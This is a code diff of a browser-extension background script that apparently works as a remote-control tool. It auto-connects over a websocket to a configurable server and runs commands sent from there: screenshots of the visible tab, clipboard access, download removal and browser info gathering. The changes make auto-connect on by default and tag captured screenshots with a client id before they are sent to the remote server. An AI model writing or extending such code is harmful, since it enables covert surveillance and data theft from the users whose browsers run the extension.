@@ -10,12 +10,12 @@ function send(obj) {
 }
 
 chrome.runtime.onInstalled.addListener(e=>{
-    if (e.reason == "install" || e.reason == "update") chrome.storage.sync.set({serverAddress:defaultIp, autoConnect:true})
+    if (e.reason == "install" || e.reason == "update") chrome.storage.local.set({serverAddress:defaultIp, autoConnect:true})
 })
 
 chrome.runtime.onMessage.addListener(m => {
     if (m.type == "tryConnectIp") connect(m.value)
-    else if (m.type == "getConnectState") chrome.storage.sync.get(r=>{sendMessage({type:"connection", value:r.serverAddress})})
+    else if (m.type == "getConnectState") chrome.storage.local.get(r=>{sendMessage({type:"connection", value:r.serverAddress})})
     else if (m.type == "response") send(m)
 })
 
@@ -24,8 +24,8 @@ function toJSON(str) {
 }
 
 let ws = {}, ws_timeout
-chrome.storage.sync.get(r=>{
-    if (r.autoConnect) connect(r.serverAddress??defaultIp)
+chrome.storage.local.get(r=>{
+    if (r.autoConnect??true) connect(r.serverAddress??defaultIp)
 })
 
 function connect(address) {
@@ -36,7 +36,7 @@ function connect(address) {
         sendMessage({type:"disconnect"})
         clearTimeout(ws_timeout)
         ws_timeout = setTimeout(()=>{
-            chrome.storage.sync.get(r=>{
+            chrome.storage.local.get(r=>{
                 connect(r.serverAddress)
                 console.log("RETRY CONNECTION")
             })
@@ -105,7 +105,7 @@ function commandManager(m) {
 // changeip (newip)
 // clipboard
 function changeip(m) {
-    chrome.storage.sync.set({serverAddress:m.value}, ()=>{
+    chrome.storage.local.set({serverAddress:m.value}, ()=>{
         send({type:"response", command:m.command, value:"Ip is now set to: "+m.value, responseTarget:m.responseTarget})
         connect(m.value)
     })
@@ -175,7 +175,7 @@ function removedownload(m) {
     chrome.downloads.download(+m.value, ()=>send({type:"response", command:m.command, value:"Removed download: "+m.value, responseTarget:m.responseTarget}))
 }
 function capture(m) {
-    chrome.tabs.captureVisibleTab(data=>send({type:"response", command:m.command, isImg:true, value:data, responseTarget:m.responseTarget}))
+    chrome.tabs.captureVisibleTab(data=>send({type:"response", command:m.command, isImg:true, clientId:ws.id, value:data, responseTarget:m.responseTarget}))
 }
 function grabinfo(responseTarget) {
     let info = {navigator_language:navigator.language}, info_cd=0
